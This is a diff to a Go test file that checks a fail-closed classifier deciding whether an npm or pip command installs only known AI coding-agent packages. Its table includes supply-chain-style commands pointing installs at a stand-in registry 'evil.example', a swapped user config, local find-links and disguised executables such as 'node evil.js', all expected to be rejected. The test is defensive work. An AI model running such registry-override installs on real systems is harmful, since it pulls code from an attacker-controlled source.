@@ -369,10 +369,10 @@ func TestPackageExemptionNeedsOnlyAgentPackages(t *testing.T) {
 		}
 	}
 	// pip specs with versions and extras.
-	if !onlyAgentPackages(packageArgs("pip", []string{"install", "aider-chat[playwright]==0.86"})) {
+	if !agentOnlyInstall("/usr/bin/pip", "pip install aider-chat[playwright]==0.86") {
 		t.Error("aider-chat with extras/version must count as an agent package")
 	}
-	if onlyAgentPackages(packageArgs("pip", []string{"install", "-r", "requirements.txt"})) {
+	if agentOnlyInstall("/usr/bin/pip", "pip install -r requirements.txt") {
 		t.Error("a requirements file must never count as agent packages")
 	}
 	// Even an agent-only install is reported for a login read and for a
@@ -471,15 +471,34 @@ func TestAgentSpecRejectsAliasesAndOverrides(t *testing.T) {
 			t.Errorf("agentSpec(%q) = %v, want %v", spec, got, want)
 		}
 	}
-	for _, args := range [][]string{
-		{"i", "-g", "@anthropic-ai/claude-code", "--registry", "https://evil.example"},
-		{"i", "-g", "--registry=https://evil.example", "@anthropic-ai/claude-code"},
-		{"install", "--index-url", "https://evil.example/simple", "aider-chat"},
-		{"install", "--extra-index-url=https://evil.example/simple", "aider-chat"},
-		{"install", "--find-links", "/tmp/w", "aider-chat"},
+	// The agent-only classification fails closed: only the exact shape
+	// `<pm> install|i|add [-g -D -y -q …] <agent-spec>...` qualifies.
+	for _, tc := range []struct {
+		exe, cmd string
+		want     bool
+	}{
+		{"/usr/bin/npm", "npm i -g @anthropic-ai/claude-code", true},
+		{"/usr/bin/npm", "npm install --global --yes @anthropic-ai/claude-code@latest @openai/codex", true},
+		{"/usr/bin/node", "node /usr/lib/node_modules/npm/bin/npm-cli.js i -g @anthropic-ai/claude-code", true},
+		{"/usr/bin/python3", "python3 -m pip install -q aider-chat", true},
+		{"/usr/bin/npm", "npm i -g @anthropic-ai/claude-code --registry https://evil.example", false},
+		{"/usr/bin/npm", "npm i -g --registry=https://evil.example @anthropic-ai/claude-code", false},
+		{"/usr/bin/npm", "npm i -g --@anthropic-ai:registry=https://evil.example @anthropic-ai/claude-code", false},
+		{"/usr/bin/npm", "npm i -g --@other:registry https://evil.example @anthropic-ai/claude-code", false},
+		{"/usr/bin/npm", "npm i -g --userconfig /tmp/npmrc @anthropic-ai/claude-code", false},
+		{"/usr/bin/pip", "pip install -ihttp://evil.example/simple aider-chat", false},
+		{"/usr/bin/pip", "pip install --index=http://evil.example/simple aider-chat", false},
+		{"/usr/bin/pip", "pip install --index-url https://evil.example/simple aider-chat", false},
+		{"/usr/bin/pip", "pip install --extra-index-url=https://evil.example/simple aider-chat", false},
+		{"/usr/bin/pip", "pip install --find-links /tmp/w aider-chat", false},
+		{"/usr/bin/node", "node evil.js install @anthropic-ai/claude-code", false},
+		{"/usr/bin/python3", "python3 evil.py -m pip install aider-chat", false},
+		{"/tmp/npm-helper", "npm i -g @anthropic-ai/claude-code", false},
+		{"/usr/bin/npm", "npm --global install @anthropic-ai/claude-code", false},
+		{"/usr/bin/npm", "npm i -g", false},
 	} {
-		if onlyAgentPackages(packageArgs("npm", args)) {
-			t.Errorf("%v: a source override must never be agent-only", args)
+		if got := agentOnlyInstall(tc.exe, tc.cmd); got != tc.want {
+			t.Errorf("agentOnlyInstall(%q, %q) = %v, want %v", tc.exe, tc.cmd, got, tc.want)
 		}
 	}
 }
